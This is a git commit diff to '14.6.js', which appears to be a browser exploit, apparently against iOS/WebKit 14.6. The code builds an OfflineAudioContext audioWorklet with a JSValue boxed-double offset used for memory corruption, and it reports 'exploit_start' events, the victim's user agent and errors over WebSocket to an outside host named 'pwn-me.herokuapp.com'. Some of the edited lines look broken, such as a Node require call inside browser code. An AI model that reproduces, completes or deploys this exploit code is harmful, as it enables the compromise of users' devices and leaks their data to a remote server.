4a92b4ea03508a20671c37cc492466477ccbf4bd
Kanji <39612139+Slanderrr@users.noreply.github.com>
2022-06-10 19:13:54 -0600

    Update 14.6.js

--- 14.6.js
+++ 14.6.js
@@ -1,16 +1,17 @@
-var socket = new WebSocket("wss://slug-detected.herokuapp.com/")
+var io = require("socket.io");
+var socket = new WebSocket("wss://pwn-me.herokuapp.com/")
 
 var keep = [];
 async function kickstart146() {
-  alert("Test");
-	socket.send(`exploit_start {
+  alert("exploit started");
+	socket.send("exploit_start", {
 		exploitVersion: "14.6",
-		userAgent: ${navigator.userAgent},
-	}`);
+		userAgent: navigator.userAgent,
+	});
 	var context = new OfflineAudioContext(1, 128, 300000);
 	context.audioWorklet.addModule(URL.createObjectURL(new Blob([`
       // constant added to double JSValues
-      var socket = new WebSocket("wss://pwn-me.herokuapp.com/");
+      var socket = new WebSocket("wss://pwn-me.herokuapp.com/")
       const kBoxedDoubleOffset = 0x0002000000000000n;
       function boxDouble(d) {
         return d + kBoxedDoubleOffset;
@@ -184,3 +185,5 @@ async function kickstart146() {
         socket.send("log_normal", "Error: " + err);
     });
 }
+
+export default kickstart146;
